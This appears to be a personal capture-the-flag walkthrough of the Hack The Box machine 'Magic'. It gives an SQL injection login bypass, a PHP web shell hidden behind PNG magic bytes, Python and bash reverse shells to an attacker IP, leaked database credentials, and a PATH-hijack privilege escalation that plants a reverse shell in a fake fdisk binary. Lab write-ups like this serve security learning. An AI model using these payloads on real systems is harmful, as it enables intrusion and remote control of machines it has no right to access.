# 🪄 HTB Walkthrough – making a magical walkthrough with Magic

### 🧠 TL;DR

* SQLi login bypass
* Upload bypass via magic bytes
* Reverse shell via Python
* Credentials leakage → Privilege escalation
* `.htaccess` blocks direct access to malicious files
* Custom binary `sysinfo` used for final foothold

***

### 🧩 Step 1 – Login Bypass

Classic SQL injection:

```sql
' OR 1=1; -- 
```

Logged in as admin, because who needs credentials when you've got logic flaws?

### 🎭 Step 2 – File Upload Bypass via Magic Bytes

Bypass the upload filter expecting valid PNG/JPG magic bytes:

```
head -c 150 image.png > shell.php.png
```

Append web shell payload:

```
<?php
if (isset($_REQUEST["cmd"])) {
    echo "<pre>";
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>";
    die;
}
?>

```

Uploaded as `shell.php.png`, slipped past MIME and magic number check.

***

### 📞 Step 3 – Reverse Shell

Tried bash reverse shells → ❌\
Checked for Python → ✅

Crafted Python3 reverse shell:

```
http://10.10.10.185/images/uploads/image.php.png?cmd=export%20RHOST=%2210.10.14.3%22;export%20RPORT=443;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22/bin/bash%22)%27
```

```
export RHOST="10.10.14.3";export RPORT=80;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### 🔐 Step 4 – Credential Discovery

Found in `db.php5`:

```
private static $dbName = 'Magic';
private static $dbHost = 'localhost';
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

### 🔎 Step 5 – Enumerating MySQL Binaries

`mysql` client missing? No problem.

```
for dir in ${PATH//:/ }; do
  ls "$dir"/mysql* 2>/dev/null
done
```

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Used `mysqldump` to extract all DBs:

```
mysqldump -u theseus -p --all-databases > all_db_backup.sql

```

```
cat all_db_backup.sql | base64 > all_db_backup.sql.base64

```

```
cat all_db_backup.sql.base64 | base64 -d > all_db_backup.sql.base64

```

found password

```
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```

### 🧗‍♂️ Step 6 – Privilege Escalation

Switched user:

```
su theseus
```

Checked for custom binaries: (i did look through the walkthrough, i did get it in ,Linpease but i skipped it while reading through it)

```
/bin/sysinfo

```

* a did a strings and got it know it was using a couple of binaries with a full path not set

```
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.3/80 0>&1' > fdisk
chmod +x fdisk
export PATH="/home/theseus:$PATH"
/bin/sysinfo

```

* Spun an nc listen on my machine on port 80 and got root



### 🛑 Post-Root Notes

#### ❌ Couldn't download SQL backup via browser?

Blocked by `.htaccess`:

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

📂 Upload Filter Breakdown (PHP Logic)

```
$allowed = array('2', '3');
<SNIP>

if ($uploadOk === 1) {
        // Check if image is actually png or jpg using magic bytes
        $check = exif_imagetype($_FILES["image"]["tmp_name"]);
        if (!in_array($check, $allowed)) {
            echo "<script>alert('What are you trying to do there?')</script>";
            $uploadOk = 0;
        }
    }


<SNIP>
```

**🔎 `$allowed = array('2', '3');` — What does it mean?**

This line is checking **magic numbers** (also called **image type constants**) returned by PHP’s `exif_imagetype()` function.

**🧬 `exif_imagetype()` returns an integer, not a string.**

Here’s what those numbers mean:

| Return Value | Image Type      |
| ------------ | --------------- |
| `1`          | GIF             |
| `2`          | JPEG            |
| `3`          | PNG             |
| `4`          | SWF             |
| `5`          | PSD             |
| `6`          | BMP             |
| `7`          | TIFF (Intel)    |
| `8`          | TIFF (Motorola) |
| `9`          | JPC             |
| `...`        | etc.            |

### 🧠 Final Thoughts

This box covers:

* Basic SQLi
* Image upload filtering bypass
* Manual reverse shell crafting
* Hunting binaries for data extraction
* Blocking mechanisms using `.htaccess`

Great blend of web exploitation and privilege escalation.
